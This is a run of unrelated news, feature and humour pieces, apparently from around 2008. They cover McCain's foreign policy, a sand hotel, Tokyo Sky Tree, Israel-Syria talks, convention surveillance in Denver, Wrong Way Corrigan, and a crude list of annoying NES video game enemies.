McCain ’s calls for enlarging the G - 8 would snub China and condemn the G - 8 to “ failure and irrelevance . ”
McCain has proposed that the U.S. should expand the G - 8 specifically by taking in India and Brazil — but pointedly excluding China .
Fareed Zakaria notes : “ To reorder the G - 8 without China would be particularly bizarre .
The G - 8 was created to help coordinate problems of the emerging global economy .
Every day these problems multiply — involving trade , pollution , currencies — and are in greater need of coordination .
To have a body that attempts to do this but excludes the world 's second largest economy is to condemn it to failure and irrelevance . ”
[ Newsweek , 05/05/08 ]
France and Germany
McCain threatened and bullied our allies before the start of the Iraq War .
“ Speaking at an international security conference in Germany a month before the war , a frustrated McCain lashed out at our European allies , calling them " vacuous and posturing . "
Later that year , in an interview , he referred to the French and Germans as " our adversaries . "
He said that former German Chancellor Gerhard Schroeder " looks little like the ally that anchored our presence in Europe throughout the Cold War . ... A German Rip Van Winkle from the 1960s would not understand the lack of political courage and cooperation with its allies on the question of Iraq exhibited in Berlin today . "
McCain also unleashed on two other critical players , accusing France and Russia of putting their " commercial interests above international law , world peace , and the political ideals of Western civilization . "
[ The New Republic , 5/7/08 ]

The world 's first ever sand hotel has been made in Dorset and is accepting its first guests for £ 10 a night .
It took 1,000 tonnes of sand and a team of four sculptors working 14 hours a day for seven days to build the structure on Weymouth beach .
Guests can book to stay in the hotel , which includes beds made out of sand , until the rain washes it away .
The structure was created by a hotel company to celebrate a resurgence of holidaymakers flocking to the seaside .
Research by Laterooms.com predicts 37 million people will enjoy British beaches this year .
The beds are made of sand so it can get everywhere , especially between the toes
Mark Anderson , sand hotel sculptor
The sand hotel offers a twin and double bedroom , while the roofless structure gives guests the chance to " star - gaze " at night , the firm said .
But there are no toilet facilities and people were warned the sand " gets everywhere " .
Mark Anderson , creator of the sand hotel , said : " It is the biggest sandcastle - like structure ever in the UK .
" Four of us worked hard and with the help of a JCB we got it built .
" The beds are made of sand so it can get everywhere , especially between the toes .
" But the best thing is in the morning the tide laps through the door , what a great way to wake up . "
Kathy Gwinnett , of Laterooms.com , said : " It 's great that British beach holidays are enjoying a renaissance and that some of the less obvious resorts , such as Weymouth and Torquay , are getting rediscovered by a younger generation . "

Tokyo Sky Tree is expected to soar 2003 feet ( 610 meters ) into the sky over Japan 's capitol city by late 2011 , making it the nation 's tallest man-made structure and , at least for a time , the world's .
On June 10 , 2008 , the new tower 's official name " Tokyo Sky Tree " was announced .
Approximately 33,000 out of 110,000 people participating in a Name The Tower contest voted for the name with five other possible names in the final listing receiving fewer votes .
Tokyo Sky
Tree will be the centerpiece of a massive new commercial development located in the area of what is now Oshiage Station in Tokyo's Sumida ward .
A consortium of six Japanese broadcast companies led by national network NHK proposed and planned the tower , which is expected to be completed in December of 2011 .
Considering Japan 's reputation as a country prone to large earthquakes , the new tower will incorporate the latest seismic engineering techniques but will also recall the balanced construction of Kyoto 's five - level pagoda that has stood firm for centuries .
The tower will gradually change in cross-section from triangular at the base to round at the 1,000 ft point , the better to withstand strong winds .
It is also designed to have a pleasing appearance inspired by Samurai swords ( hey , there 's a name ... the Katana ! ) that will not clash with traditional Japanese architecture - not that there 's much of that left in Tokyo these days .
Now yes , there already IS a Tokyo Tower and it's been a city landmark since opening in 1958 .
Based stylistically on the Eiffel Tower in Paris , France , " Tokyo Tower " stands 1,093 feet ( 333 meters ) tall ... very respectable in the Fabulous Fifties but insufficient to meet the needs of today 's electronically advanced society .
Besides that , Tokyo's modern skyline is dominated by skyscrapers which interfere with signals beamed to and from the now not - so - towering " old " Tokyo Tower .
A quote from Tokyo Sky Tree 's official website typifies the natural enthusiasm and disarming honesty so often found in Japan and Japanese : " This is a new 2nd broadcasting tower in Japan and will be the tallest broadcasting - tower ( Wow ! 610 meter / 2000 ft ) in the world , if the construction is completed successfully . "
That 's a big " if " ... c'mon guys , show a little confidence !
Recently a group of researchers in Sweden and Japan reported the development of a new type of paper that resists breakage when pulled apart almost as well as that of cast iron .
Composed of sub-microscopic particles of cellulose , this material , which has been called “ cellulose nanopaper ” , may open the way for expanded use of paper as a construction material as well as in other various applications .

of Technology )
Lars A. Berglund , head of the research team , along with his colleagues , noticed that cellulose has potential as a strong , lightweight ingredient in composites and other materials in a wide range of products .
Cellulose is a tough , widely available substance , easily obtained from plants .
Although cellulose - based composites have high strength , until recently existing materials were brittle and had a tendency to snap easily when pulled .

This latest study described a possible solution to the problem , involving the exposure of the wood pulp to certain chemicals to produce this new cellulose nanopaper .
The researchers found that its strength and ability to resist pull before snapping exceeded that of cast iron .
By changing the paper ’s internal structure , the researchers were able to adjust the paper ’s strength .
TFOT recently covered a newly created microbe which produces cellulose that can be turned into ethanol and other biofuels , as well as graphene paper which is tougher than diamonds , and a strong , light transparent plastic .

1. The Firing Squad
Pirate Pete had been captured by a Spanish general and sentenced to death by his 50 - man firing squad .
Pete cringed , as he knew their reputation for being the worst firing squad in the Spanish military .
They were such bad shots that they would often all miss their targets and simply maim their victims , leaving them to bleed to death , as the general ’s tradition was to only allow one shot per man to save on ammunition .
The thought of a slow painful death made Pete beg for mercy .
“ Very well , I have some compassion .
You may choose where the men stand when they shoot you and I will add 50 extra men to the squad to ensure someone will at least hit you .
Perhaps if they stand closer they will kill you quicker , if you ’re lucky , ” snickered the general .
“ Oh , and just so you do n’t get any funny ideas , they ca n’t stand more than 20 ft away , they must be facing you , and you must remain tied to the post in the middle of the yard .
And to show I ’m not totally heartless , if you are n’t dead by sundown I ’ll release you so you can die peacefully outside the compound .
I must go now but will return tomorrow and see to it that you are buried in a nice spot , though with 100 men , I doubt there will be much left of you to bury . ”
After giving his instructions the general left .
Upon his return the next day , he found that Pete had been set free alive and well .
“ How could this be ? ” demanded the general .
“ It was where Pete had us stand , ” explained the captain of the squad .
Where did Pete tell them to stand ?

From this I will decide which of you is the wisest and worthy enough to inherit my land . ”
So they all went to the market and bought something that they thought would fill the room , yet was still small enough that they could fit into their pockets .
Each son came back with a different item .
The father told his sons to come into his bedroom one at a time and try to fill up his bedroom with whatever they had purchased .
The first son came in and put some pieces of cloth that he had bought and laid them end to end across the room , but it barely covered any of the floor .
Then the second son came in and laid some hay , that he had purchased , on the floor but there was only enough to cover half of the floor .
The third son came in and showed his father what he had purchased and how it could fill the entire room yet still fit into his pocket .
The father replied , “ You are truly the wisest of all and you shall receive my property . ”
What was it that the son had showed to his father ?

Pictured :
The orphan deer adopted by a pack of bloodthirsty fox hounds
The heaving mass of fox hounds would intimidate even the biggest stag .
But tiny orphan deer Bam Bam is n't scared .
Like his namesake Bambi the 10 - week - old is a friendly creature and trots along with huntsman Adrian Thompson , 42 , and his pack of 60 hounds .
Oh Dear :
This little deer thinks he 's a fox hound
The pack immediately accepted the lost fallow deer when they found him shivering by the Thompsons ' front gate just an hour after he had been born .
Rather than being overwhelmed by the attention of such a large pack of dogs , from the Chiddingfold , Leconfield and Cowdray hunt , the confused little fawn thought he'd found his family .
A surprised Mr Thompson said : ' Now Bam Bam thinks he 's a Fox Hound because they all treat him like one of their own .
' He wo n't be going on any hunts though - he does n't have the stamina for it .
It 's a fantastic sight to see although we know it 's a strange one and Bam Bam certainly gets a lot of funny looks from passers - by .
' People shake their heads in astonishment when they spot Bam Bam in among all the hounds as if they can't believe what they 're seeing . '
Are you my mummy ?
Bam Bam investigates the camera
The friendly fawn is happiest among his fellow hounds on their daily walk .
Mr Thompson 's wife , Karen , 41 , said : ' Bam Bam seems most content when he 's ambling along with the hounds .
He 's about the same size as them now so he fits in perfectly and walks along with the pack like they 're his brothers and sisters . '
Although the Fox Hounds have come to accept Bam Bam as one of their own , Mr Thompson 's other dogs are rather less tolerant .
He said : ' A pack of domestic dogs would most certainly kill a deer that came across it 's path - I also have two terriers and they would certainly kill anything that came into the garden .
They 're only just starting to accept little Bam Bam but I still would n't leave them alone with him .
Bam Bam runs with the hounds , his new family
' My Fox Hounds are very different though - the image of them as savage killers is completely wrong .
They can be very placid animals and are very accepting of other animals - especially deer . '
After Bam Bam was discovered by the dogs earlier this summer he was brought into the family home in Petworth Park , West Sussex by Mr Thompson 's 12 - year - old son , Tommy .
When Karen came down for breakfast that morning she was stunned to see the pair sitting happily on the living room floor .
She said : ' It was such a surprise , the deer was n't afraid at all .
He seemed to think that Tommy was his mum because he followed him around the room , and would hide behind the furniture if Tommy ever left . '
Adrian Thompson and his wife Karen Barker get to know the newest member of their pack
It was uncertain whether Bam Bam would survive without the care and attention of his mother who had deserted him just yards from the Thompsons ' home , possibly scared off by the dogs .
Karen said : ' It was touch and go for the first few days .
We had to feed him half an ounce of lamb 's milk every hour - this had to be done 24 hours a day and was quite draining .'
Bam Bam is now regarded by the Thompsons as a member of the family .
Karen said : ' He wanders around the garden and comes to play with us .
We 've had a few garden parties and he is such a favourite with the guests - he 's so friendly and is adored by everyone who meets him . '
Bam Bam , who will grow into a 177 pound adult , will stay with the family until they feel he can be safely released into the wild .
One of the gang : Bam Bam on his daily walk with his fox hound friends
Karen said : ' We can't release him into the park here because there are too many people about .
Bam Bam is not afraid of humans and we 're worried that this may make him dangerous .
' He already gives us a nudge when he wants to eat and it's not so bad because he 's only little but imagine what a nudge could do when he 's got a fine pair of antlers . '
The Thompsons will be sad to lose such a treasured member of the family but they know they can't keep him forever and plan to set him free once he 's fully grown .
Next year they intend to rehome Bam Bam in a private park where he will be able to join a herd and finally learn how to be a deer .
Traditionally , deer hunting involves chasing the animal with a pack of dogs until it surrenders to exhaustion and can be shot .
This practice was banned under the Hunting Act 2004 .
Deer stalking , where the hunter is close enough to kill the animal with a clean shot , is still permitted but with no more than two dogs .
JERUSALEM ( Reuters ) - Israel set terms for concluding a peace deal with Syria on Thursday , closing ranks with Washington in demanding Damascus distance itself from Iran and stop supporting Palestinian and Lebanese militants .
Coordinated announcements on Wednesday by Israel and Syria that they had begun indirect talks in Turkey , the first confirmation of negotiations between the long - time enemies in eight years , drew a lukewarm response from the United States .
Many analysts say U.S. hostility to Damascus , and to its Iranian and Lebanese Hezbollah allies , makes a Syria - Israel deal unlikely before President George W. Bush steps down in January .
Summing up three days of discussions in Istanbul , Turkish Foreign Minister Ala Babacan said both sides were satisfied they had found “ shared ground ” .
He said future talks would be held periodically in Turkey .
“ The Syrians know what we want and we know what they want , ” Israeli Prime Minister Ehud Olmert said in Jerusalem .
Olmert revealed the talks two days before he faces a second round of police interrogation over graft allegation .
Syria is demanding the return of the Golan Heights , a plateau overlooking Damascus on one side and the Sea of Galilee on another , since Israel captured the strategic territory in the 1967 Middle East war .
Syrian Information Minister Muhsin Bilal condemned Israel ’s setting of any prior conditions .
“ These conditions have already been rejected as is the phrase ‘ difficult concessions ’ as what the Syrians are demanding is their right , ” Bilal told Al Jazeera television .
Olmert , who recently took a vacation on the Golan Heights , has not said publicly that Israel would give up all of the area .
But he has spoken of “ difficult concessions ” Israel would have to make in any land - for - peace accord with Syria .
Echoing U.S. comments , Israeli Foreign Minister Tzipi Livni said Syria needed to “ distance itself completely ” from “ problematic ties ” with Iran .
Syria , she told reporters , must also stop “ supporting terror -- Hezbollah , Hamas ” , groups backed by the Islamic Republic .
Israeli Defense Minister Ehud Barak , who as prime minister in 2000 took part in U.S. - hosted talks with Syria that failed over the key issue of the future of the Golan Heights , said in a speech that both sides would have to make “ painful concessions ” .
No U.S. OBJECTION
Slideshow ( 3 images )
The United States , in its initial public reaction to Israeli - Syrian contacts , said it did “ not object ” to talks but repeated its criticism of Syria ’s “ support of terrorism ” .
The United States and Israel consider Hamas a terrorist organization .
The Islamist group , which seized control of the Gaza Strip last June , opposes statehood talks between Olmert and Palestinian President Mahmoud Abbas that Washington hopes can result in a deal by year ’s end .
Palestinian Prime Minister Salam Fayyad , speaking in the occupied West Bank , said he was not worried Israel would pursue peace with Syria at the expense of progress in the U.S. - brokered negotiations with the Palestinians .

“ The concern is if the ( Israeli - Palestinian ) political process ... does not proceed at the pace necessary , ” Fayyad told reporters .
“ I hope other tracks are moving and moving well . ”
Olmert , who revealed the discussions with Syria two days before he faces a police interrogation over bribery allegations he has denied , said peace efforts would be lengthy and complex .
A television poll found 70 percent of Israelis oppose giving back the Golan Heights to Syria , and a majority also believed Olmert was using the talks to distract from the criminal investigation that could force him from office .
“ Everyone knows that Olmert wants to end his term on a diplomatic note , not a criminal one .
The question is , what will come first -- an indictment or a peace treaty , ” columnist Yossi Verter wrote in newspaper Haaretz .
Barak , leader of Israel ’s centre - left Labor Party , said peace with Syria could be achieved only from a position of strength and self - confidence .
Eight months ago , Israeli jets bombed what U.S. officials described as a North Korean - built nuclear facility in Syria .
Syrian Foreign Minister Walid al - Moualem said Israel had shown that it might return the plateau .
“ Without this commitment we cannot conduct any negotiation , ” he told Reuters .
The Israeli -Syrian talks in Shepherdstown , West Virginia in 2000 broke down over control of the shore of the Sea of Galilee , where Israel draws much of its water .
Among Olmert ’s vast army of domestic critics , supporters of the 18,000 Jewish settlers in the Golan Heights threatened to bolt his fragile coalition if he tries to give up the territory .
Others wondered aloud if Wednesday ’s announcement was not timed to divert attention from Olmert ’s troubles with the police .
They will interview him for a second time , on Friday , over suspicions he took bribes from an American businessman .
Olmert has said he would resign if indicted .
An August 29th article on Science Daily explains how hurricane ’s Katrina and Rita can give us insight into some offshore drilling issues should Gustav cause damage in the Gulf of Mexico .
The findings of Dr. Satish Nagarajaiah , Rice University professor , studied the damage to offshore drilling platforms following the 2005 hurricanes Katrina and Rita .
As the offshore drilling debate persists and Gustav travels through the Gulf of Mexico this weekend Dr. Nagarajaiah ’s findings provide important information to consider as we watch the prices at the pump in the aftermath of Gustav .
Both Katrina and Rita were category 5 hurricanes and each one caused damage to an estimated 3,000 oil platforms and 22,000 miles of pipelines in the Gulf of Mexico .
The following damage is recorded :
52 platforms with major damage
19 of the floating drill units exposed to hurricane force winds went adrift or were damaged
115 platforms destroyed
Eight rigs destroyed
535 pipeline segments damaged
Dr. Nagarajaiah explains that the rigs and platforms may have ongoing damage due to past storms , making them more susceptible to current and future storm surge and wind damage .
If and when damage occurs to these platforms , equipment and pipelines the potential for more increases at the pump becomes greater and greater .
This Science Daily article states :
When Katrina and Rita struck , gas prices soared as a result of damage to oil facilities .
With oil prices at all - time highs this year , U.S. oil production in the Gulf of Mexico has a direct impact on gasoline prices .
Hurricane Gustave is currently in the Gulf of Mexico .
Oil platforms began evacuations on Wednesday , interrupting production and causing crude oil prices to rise already .
Storm Exchange lead energy analyst , Lynda Clemmons , explains :
“ Crude and natural gas prices fluctuate with each weather update that comes out , leading to an enormous amount of volatility and general upward pressure on prices , ” said Clemmons .
“ Nobody wants to miss out on these trading opportunities .
Except for the smallest of trading houses or funds , most banks , energy companies , and utilities have business continuity plans that kick in depending on the threat level of the impending storm . ”
How will Gustav hurt those who support pursuing more offshore drilling ?
Hurricane seasons from 2004 to present have been unquestionably devastating .
The cost effectiveness of offshore drilling will come into question on the heels of Gustav .
As a proponent of obtaining American oil , this does cause me to take into consideration the volatile situation at hand and how this directly affects U.S. oil production and prices on an ongoing basis .

The Democratic National Convention will serve as a catalyst for the creation of a temporary “ super fusion ” center that two local police officials hope will permanently expand domestic intelligence powers in Colorado .
The concept , outlined by Michael Battista , deputy chief of operations for the Denver Police Department , in little - noticed congressional testimony last summer , will culminate in security preparations for next week ’s convention managed by the largest convergence of law enforcement , military and emergency personnel in the state ’s history .
The massive apparatus used by federal agencies like the United States Secret Service and the Federal Bureau of Investigation will be deployed to gather intelligence about potential threats and “ suspicious activities ” during the convention .
The Colorado Independent reported last month that the state ’s intelligence fusion center , known as the Colorado Intelligence Analysis Center ( CAIC ) will be operating 24 hours a day during the convention and will be fully staffed with up to eight intelligence analysts at any given time .
The work being done by law enforcement has raised concerns among civil liberties advocates about the surveillance of law - abiding citizens .
“ This is something that ’s really growing , ” says Mike German , a former FBI agent who now works for the American Civil Liberties Union ( ACLU ) .
The further expansion certainly marks a dramatic , if temporary , expansion of the fusion center concept .
The Multi-Agency Communication Center ( MACC ) , the main nerve center for all convention security and safety operations , will be a much more massive undertaking than CIAC .
Located in Lakewood , the MACC will include 55 local , state and federal agencies , coordinating the work of all law enforcement and safety agencies involved with the convention , according to Malcolm Wiley , a spokesperson for the Secret Service , the agency that will be managing the commutations center .
“ It ’s just one of the many things that is always in place , ” Wiley says , noting that MACCs have been used at other high - profile security events , including Super Bowls and previous political conventions , as a standard practice .
The MACC will start operations on Saturday , Aug. 23 at 9 a.m , and will stop after Aug. 28 when the convention ends , according to Wiley .
Representatives with the 55 agencies at the MACC will be sharing information and situational awareness in real time .
Among the government agencies participating are the Colorado National Guard , the Department of Homeland Security , the Federal Air Marshals , Federal Emergency Management Agency , the Transportation Security Administration and the Environmental Protection Agency .
The Secret Service ’s Intelligence Operation Center usually conducts background checks or investigates possible threats relating to a security event , and will be sharing information with the MACC while the convention is taking place .
Law enforcement officials working at MACC , meanwhile , will also be sharing security information with national centers that trade communications and coordinating actions to prevent potential terrorist attacks and other domestic incidents , according to Timothy Koerner , an assistant director with the Secret Service who testified at the same congressional Homeland Security hearing in 2007 .
The national centers include the the Secret Service Joint Operations Center , the FBI Strategic Information Operations Center and DHS National Operations Center , all three of which are located in Washington , D.C. , along with Northern Command , a military unit located in Colorado Springs 70 miles south of Denver .
“ The federal , local and state officials are all working together jointly on the convention , and it ’s a coordinated effort to make sure everything goes smoothly , ” said Denver police spokesperson Sonny Jackson , who referred specific inquires about intelligence operations and the MACC to the Secret Service .
The CIAC will share communications with the MACC if and when warranted , said Lance Clem , a spokesman for the Colorado Department of Public Safety .
“ It ’s an indirect reporting role , ” Clem said .
“ CIAC is a place where citizens can report suspicious activity during the convention and at other times .
If CIAC determines that information should be acted on , CIAC will send it to the Federal Bureau of Investigation or to a local law enforcement agency . ”
What happens after the convention ?
In his congressional testimony last summer , Battista urged that the use of the Secret Service ’s Intelligence Operations Center and the MACC to consolidate intelligence between agencies during the Democratic convention “ should be built upon ” with the financial support of the federal government through the funding offull - time employees .
The result , according to Battista , would “ leave an intelligence sharing legacy ” in Colorado .
During the same hearing , Police Chief Daniel Oates with the Aurora Police Department , which is supplying 300 police officers for convention security , testified that the “ world - class criminal intelligence apparatus ” used during the convention be sustained permanently in Colorado and that it include “ a linked network of all records management systems and other valuable data systems of all police agencies in the state . ”
Oates explained the system as a data mining initiative that organizes information from databases to find links between specific details :
Beyond merely linking data , our vision calls for a modern system with state - of - the - art analytical tools — one that can , for example , probe and make sense of all kinds of disparate data , that can perform visual link analysis , that can respond to ad hoc queries by talented analysts and detectives , that can find the link , for example , between a license plate , a phone number , asuspect ’s description , a nickname , a tattoo , and / or a particular method of committing crime .
The Jefferson County Sheriff ’s Office has recently partnered with nine local police agencies to purchase state - of - the - art proprietary software to mine data , Oates said .
The police chief also testified that law enforcement in the cities of Aurora and Grand Junction , along with Arapahoe , Adams , and Mesa counties , would be purchasing the same software by February 2009 to “ join the Colorado intelligence - sharing consortium . ”
A second part for increasing intelligence sharing in the state , according to Oates ’ testimony , is to expand the role of the CIAC , which is headquartered in Centennial south of Denver .
CIAC analysts from local , state and federal agencies have access to more than a dozen government databases while receiving reports of “ suspicious activity ” — activity that some civil rights advocates claim could be nothing more than participating in peaceful protests or photographing federal facilities that could be targeted for terrorist attack .
In his testimony , Oates states that “ several police chiefs and sheriffs here have just recently begun to press to expand ” CIAC into a full - time intelligence center that is staffed by 30 or more law enforcement officials .
Right now the CIAC is fully staffed with up to eight intelligence analysts .
Civil Liberties at risk ?
Mike German of the ACLU says the idea of a “ super fusion ” center is new and ambiguous .
“ I ’ve never heard of the concept , ” German said , noting that the original purpose of “ fusion ” centers was to act as a conduit for information as part of a cross- jurisdictional communication network .
“ What is the purpose of a fusion center if not to do this ?
Why are we creating something separate ? ” he asked .
“ Is the next step we ’re going to have a super - duper fusion center ? ”
German has released two reports on “ fusion ” centers , finding multiple problems with the practice of data consolidation and mining through information to find terrorism suspects .
For instance , in July it was reported that undercover Maryland state troopers had been spying on peaceful protesters and that they were trading information on activists , including names , that was accessible to the state ’s fusion center and other federal agencies , prompting the Maryland officials to reevaluate intelligence - gathering policies .
The The U.S. Justice Department is also proposing new domestic spying measures that would make it easier for law enforcement officials in Colorado to collect and share intelligence with the federal government .
In response to questions relating to the planned increase in domestic intelligence operations during and after the convention , Colorado Democratic Congressman Ed Perlmutter , who sits on the intelligence subcommittee and recently toured CIAC , released a statement that said : “ I believe that information sharing between law enforcement agencies and other stakeholders is critical to prevent terrorist attacks and other crimes . ”
Perlmutter also stated that he wanted to see “ fusion ” centers meet their mission while respecting civil liberties .

1938 : Douglas Corrigan claims his place in the annals of aviation history when he " mistakenly " flies from New York to Ireland .
With a single flight , Corrigan breaks the law , charms the Irish , becomes an American hero and earns an unforgettable nickname .
According to the flight plan he filed beforehand , his destination was California .
Maybe it was , and maybe it was n't : Corrigan had wanted to fly to Ireland all along , hoping to emulate Charles Lindbergh 's solo trans -Atlantic flight of a decade earlier .
But the Bureau of Air Commerce denied the request , on the grounds that Corrigan 's plane – a rather well - used Curtiss Robin OX - 5 monoplane – was too unstable for a long flight over water .
Like other early aviators , Douglas Corrigan was drawn to flying at an early age .
While still a teenager , he took a paid ride aboard a Curtiss JN - 4 " Jenny , " and once bitten with the bug , there was nothing else to do but fly .
Within a week Corrigan was taking lessons , and he made his first solo flight in 1926 , still younger than 20 .
Offered a job as an aircraft mechanic with Ryan Aeronautical Company , Corrigan moved to the firm 's San Diego factory and wound up on the team that built Lindbergh 's Spirit of St. Louis .
In fact , it was Corrigan who pulled the chocks away from the plane as Lindbergh prepared to take off for New York , and history .
Lindbergh 's epic solo flight left a lasting impression on young Corrigan , who resolved to make a similar flight .
He bought the Robin , used , in 1933 and spent a couple of years modifying the plane , trying to get it rated airworthy enough for certification .
He never did , and at one point officials in California grounded the rattling bucket of bolts – which Corrigan had named Sunshine – for six months .
Finally , in 1938 , he was ready .
Armed with a conditional permit , Corrigan flew to New York .
He took off in the early - morning fog of Floyd Bennett Field in Brooklyn on July 17 , ostensibly bound for California .
This is where things get a bit murky .
Corrigan steadfastly maintained , with a twinkle in his eye , that he was indeed intending to fly to California but was compelled to take off to the east because of the weather , and got turned around owing to a balky compass on board .
He said he did n't discover his navigational error until he was 26 hours into the flight , a claim that lifted more than a few eyebrows .
The thing is , Sunshine really was a crate .
It was patched up and lashed together and , worse , during the California - New York flight had developed a gas leak that Corrigan decided he did n't have time to repair .
Gasoline actually leaked into the cockpit while the plane was over the Atlantic .
Corrigan solved that problem by using a screwdriver to punch a hole in the cockpit floor .
So , after a flight of 28 hours , 13 minutes , Corrigan reached Baldonnel Airfield in Dublin in a plane that was structurally unsound , leaking fuel , lacking a reliable compass and equipped with reserve fuel tanks mounted in such a way that they blocked his straight - ahead view .
Corrigan received a warm welcome in Ireland and was taken to Dublin town , where he met Prime Minister Eamon de Valera , as well as eager reporters .
The Irish were particularly tickled by Corrigan 's assertion that his faulty compass was to blame for the wrong - way flight , and the American press wasted no time in nicknaming him " Wrong Way " Corrigan .
" Wrong Way " and his junk pile of a plane were eventually bundled aboard the liner Manhattan and shipped home , where he received a ticker - tape parade that drew a bigger crowd than turned out for Lindbergh in 1927 .
Interview followed interview , and Corrigan doggedly stuck to his story , basically : " I got turned around up there and wound up flying east . "
Everybody figured Corrigan was pulling a fast one , including President Franklin Roosevelt , who later told him , smilingly , that he believed every word of Corrigan 's story .
No doubt some aviation authorities would have loved sticking it to their wayward pilot , but Corrigan 's goofy feat had so captured the national imagination – he received congratulatory telegrams from a number of prominent Americans , including Henry Ford and Howard Hughes – that the best they could do was a 14 - day suspension of his license .
Case closed .

What it is : Envirosight SuperVision 250
What it 's used for :
Revealing damage deep inside city pipes
You go , you flush : out of sight , out of mind .
Not for city maintenance crews .
With 850 billion gallons of sewer and storm water leaking into watersheds around the country every year , the Environmental Protection Agency is cracking down on cracked pipes .
And the SuperVision 250 is riding that great , stinky wave of demand .
Placed in pipes 10 to 72 inches in diameter , this little guy will track down splits , debris , corrosion , and breaks .
Operators can watch the video feed from the 10X optical - zoom autofocus camera and use a joystick to pan and tilt .
A ring of high - intensity , shadowless LEDs illuminates the scene ; dual lasers help size up defects .
A sapphire window shields the camera lens , while hardened stainless steel parts protect the crawler from the harsh sewer environment .
And thanks to an ultrathin , Kevlar - reinforced tether ( sorry , no wireless ) , the bot can crawl up to 1,640 feet through even heavily obstructed pipes .
Just make sure to hose it off when it comes back .

1. Igor , A.K.A. , the little jumping flea / monkey dude from Castlevania
Igor first appears in stage 3 , spastically jumping around in chaotic fashion .
He also appears in stage 4 as a boss ( with Frankenstein 's monster ) , but the focus of my ire is the generic , non -boss version .
Igor will crash into you repeatedly , quickly draining away health if you are n't careful .
The most annoying thing about Igor is that there is no semblance of a pattern to his movements .
The Medusa heads are annoying , but at least they move in a predictable wave - like pattern .
Trying to figure out where Igor is going to jump next is as frustrating as trying to masturbate to the scrambled Spice channel when you 're in high school and too afraid to own a real porno should your mother discover it .
For the record , my mom was a nosy bitch .
It was three weeks before I could look her in the eye when she found my " Intercourse With The Vampire " video while " cleaning " my room .
2. Red Bubbles from The Legend of Zelda
Appearing only in the second quest of The Legend of Zelda , red bubbles derive you of the ability to use your sword should they touch you .
To be able to use your sword again , you must find and touch a blue bubble .
The annoyance was -- besides the obvious condition of not being to use your sword and getting attacked by enemies -- traveling to other rooms of the dungeon , often backtracking , to find a blue bubble .
It was like the red bubbles caused Link impotence , and only a blue bubble could restore his manhood .
An interesting parallel to Viagra , I suppose , right down to the blue color of the pill and " good " bubble , to the red color of the " bad " bubble and the blister I saw on my girlfriend 's crotch that led to my impotence .
3. Eggplant Wizards from Kid Icarus
Many bizarre enemies inhabit the world of Pit in Kid Icarus , but none are as strange as the eggplant wizards .
Similar to Zelda 's red bubbles , the eggplant wizards are capable of rendering Pit unable to attack .
These crafty bastards hurl enchanted eggplants in your direction , and if you get hit , you turn into a giant eggplant .
I think I missed that Greek myth somewhere along the way .
Anyway , as an eggplant , you have to travel through the level avoiding enemies long enough to reach a healing pool to return to your original form .
The only problem is , you 'd eventually have to go back to where the eggplant wizards were .
It could be a long , repetitive process .
But really , think about this for a second - getting turned into a fucking eggplant .
How would you see ?
How could you breathe ?
Would you achieve some heightened sense of consciousness ?
There 's just something about that whole concept that 's incredibly unsettling .
It 's like watching a bukkake video with your dad .
4. Eagles or any other flying enemies in Ninja Gaiden
Jumping from platform to platform can be tricky enough for Ryu , but doing so while trying to avoid giant eagles can cause tantrums of which teenage boys should n't have .
Not only can one hit from these assholes send you falling to your death , the game will " loop " the enemy , continually respawning them after you 've killed one .
Ninja Gaiden was always considered a tough game , and a major reason was because of the cheap ways you could die .
The eagles were harbingers of that cheap bullshit , and I 'm sure on many occassions I wished death upon the game 's programmers and their children .
But I would never do that now -- I was a kid , for crying out loud .
Today , I 'm old enough to find them and kill them myself .
5. Lakitu in Super Mario Bros .
Lakitu would ride in a cloud while dropping down spiny balls from above for the entire level .
To make things more bothersome , if you managed to jump on his head and kill him , he 'd quickly respawn and torment you some more .
Finding a block high enough to get you within striking range of Lakitu was the easy part ; landing on his head and not a freshly lobbed spiny ball was more difficult .
To take Lakitu out , you had to be both careful and lucky .
Sort of like not getting a disease from an Atlantic City prostitute when all you wore was a used flavored condom you found on the floor of the men 's room .
Shame I had to leave the next day ; I would have spent a bit more time in the casino had I know the gods of fortune were smiling upon me that prior night .
6. Don Flamenco in Mike Tyson's Punch Out
No , not when you fight him the first time .
That 's easy .
The second time , the left - right - left - right pattern of punching wo n't help at all .
Instead , Flamenco keeps his distance , occassionally throwing a hard jab in between taunts .
He 'll block anything you throw at him , you 'll turn pink , you 'll dodge , recover , hit him a few times , and then it 's back to waiting for a full minute before he throws another punch .
I understand that perhaps many of you did n't have much trouble with Flamenco the second time around , but he always proved difficult for me .
Tyson , of course , was difficult , but he 's not on this list because of his " boss " status .
I remember vividly one night I had erupted into tears after losing to Tyson for like the 56th time in a row .
My dad came into my room and told me that I could n't play Nintendo anymore that night .
That 's the first time I ever called my dad a cocksucker .
It 's also the first time he successfully stuffed me in my fish tank .
7. Red Demon from Ghosts N Goblins
Ghosts N Goblins is undoubtedly one of the most difficult games for the NES .
You can basically get hit just twice before dying , the enemies are fast and unpredictable , and many of the enemies take a lot of damage before they die .
As early as in the first stage , a red demon appears .
He sits as you approach , sitting cross-legged and contemplating which positions he 'll do when screwing your girlfriend after he knocks off your armor , revealing your silly boxers and humiliating you forever .
He 's a real bastard .
There is a trick , though , that works from time to time .
You can approach very slowly , and as he starts to appear on the screen , throw your weapon ( if it 's the blue flame , just reset the game ; you 're done ) and hit him in the head .
As soon as the weapon strikes the red demon , retreat in the opposite direction .
With some luck , he 'll be gone when you return .
It 's kind of cheap , but I 've never been one who 's above using tricks .
You think my girlfriend would date me if she knew I was a felon with syphilis ?
8. Metal Slime for Dragon Warrior
Extremely rare , the metal slime has only 4 hit points but rewards you with 115 experience points should you be fortunate enough to slay one .
A big part of Dragon Warrior is gaining experience and leveling up , so when a metal slime appears only to run away , it 's quite a tease .
They really can't hurt you , so the annoyance factor is n't like that of a red demon , for example , but the way the metal slimes rub all that valuable experience in your face just to run off with it really gets my blood boiling .
It 's like the stripper that tells you you 're the cutest guy she 's danced for all night , but then she starts struggling and yelling when you go to kiss her on the mouth .
Let me tell you , a six inch stilleto heel to the scrotum is not cool .
I still say she was digging me , though .
9. Darknut from Zelda 2 : The Adventure of Link
Darknuts were annoying in the original Zelda , but could be handled relatively easily with practice and patience .
In Zelda 2 , though , the Darknuts could move their shields as well as toss swords in your direction .
It 's very tough to hit a Darknut , and the fact that they can take a lot of damage means that you 'll often battle one for a pretty long period of time .
The most annoying Darknut is the boss of Palace 3 ( he does n't qualify as a real " boss " because he 's basically just a regular Darknut after you knock him off that stupid floating horse - basically , once he is knocked off the horse , he ceases to be a boss , okay ? ) .
